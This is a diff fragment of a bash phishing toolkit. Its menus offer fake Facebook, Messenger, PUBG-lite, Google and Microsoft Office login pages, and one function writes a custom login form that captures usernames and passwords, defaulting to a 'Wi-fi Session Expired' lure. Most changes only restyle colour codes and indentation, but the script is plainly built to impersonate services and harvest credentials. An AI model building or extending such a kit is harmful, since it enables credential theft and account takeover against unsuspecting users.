-printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Fake Statics Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m Fake Messenger Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Fake Advanced Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Fake Lana Holes Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Fake Mia Khalifa Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;93m Fake PUBG-lite Page\e[0m\n"
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option
+printf "${boldRed}[${reset}${boldLightGray}01${reset}${boldRed}]${reset}${boldYellow} Traditional Login Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}02${reset}${boldRed}]${reset}${boldYellow} Create account${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}03${reset}${boldRed}]${reset}${boldYellow} Fake Mobile Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}04${reset}${boldRed}]${reset}${boldYellow} Fake Security page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}05${reset}${boldRed}]${reset}${boldYellow} Fake Statics Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}06${reset}${boldRed}]${reset}${boldYellow} Fake Messenger Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}07${reset}${boldRed}]${reset}${boldYellow} Fake Advanced Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}08${reset}${boldRed}]${reset}${boldYellow} Fake Lana Holes Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}09${reset}${boldRed}]${reset}${boldYellow} Fake Mia Khalifa Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}10${reset}${boldRed}]${reset}${boldYellow} Fake PUBG-lite Page${reset}\n"
+printf "${reset}\n"
+read -p $' ${boldRed}[${reset}${boldLightGray}~${reset}${boldRed}]${reset}${boldGreen} Select an option: ${reset}${boldCyan}\n' fb_option
 
 if [[ $fb_option == 1 || $fb_option == 01 ]]; then
 server="facebook"
@@ -643,7 +627,7 @@ server="face_deskStat"
 start1
 
 else
-printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
 sleep 1
 clear
 menu
@@ -671,7 +655,7 @@ server="advpool"
 start1
 
 else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
+printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
 menu
 fi
 }
@@ -691,7 +675,7 @@ server="google_mobile"
 start1
 
 else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
+printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
 menu
 fi
 }
@@ -708,21 +692,21 @@ microsoft_ofice() {
     server="exel"
     start1
     elif [[ $ofice_menu == 2 || $ofice_menu == 02 ]]; then
-        server="onenote"
-        start1
-        elif [[ $ofice_menu == 3 || $ofice_menu == 03 ]]; then
-            server="powerpoint"
-            start1
-            elif [[ $ofice_menu == 4 || $ofice_menu == 04 ]]; then
-                server="sharepoint"
-                start1
-                elif [[ $ofice_menu == 5 || $ofice_menu == 05 ]]; then
-                    server="word"
-                    start1
-                    else
-                        printf "\e[1;93m [!] Invalid option!\e[0m\n"
-                        menu
-                        fi
+    server="onenote"
+    start1
+    elif [[ $ofice_menu == 3 || $ofice_menu == 03 ]]; then
+    server="powerpoint"
+    start1
+    elif [[ $ofice_menu == 4 || $ofice_menu == 04 ]]; then
+    server="sharepoint"
+    start1
+    elif [[ $ofice_menu == 5 || $ofice_menu == 05 ]]; then
+    server="word"
+    start1
+    else
+    printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
+    menu
+    fi
 }
 
 microsoft () {
@@ -750,15 +734,15 @@ createpage() {
     default_pass_text="Password:"
     default_sub_text="Log-In"
     read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
-        cap1="${cap1:-${default_cap1}}"
-        read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
-            cap2="${cap2:-${default_cap2}}"
-            read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
-                user_text="${user_text:-${default_user_text}}"
-                read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
-                    pass_text="${pass_text:-${default_pass_text}}"
-                    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
-                    sub_text="${sub_text:-${default_sub_text}}"
+    cap1="${cap1:-${default_cap1}}"
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
+    cap2="${cap2:-${default_cap2}}"
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
+    user_text="${user_text:-${default_user_text}}"
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
+    pass_text="${pass_text:-${default_pass_text}}"
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
+    sub_text="${sub_text:-${default_sub_text}}"
 
     echo "<!DOCTYPE html>" > webpages/create/login.html
     echo "<html>" >> webpages/create/login.html
@@ -887,7 +871,7 @@ start1() {
                 elif [[ $option_server == 3 || $option_server == 03 ]]; then
                 start_l
                     else
-                        printf "\e[1;93m [!] Invalid option!\e[0m\n"
+                        printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
                         sleep 1
                         clear
                         start1
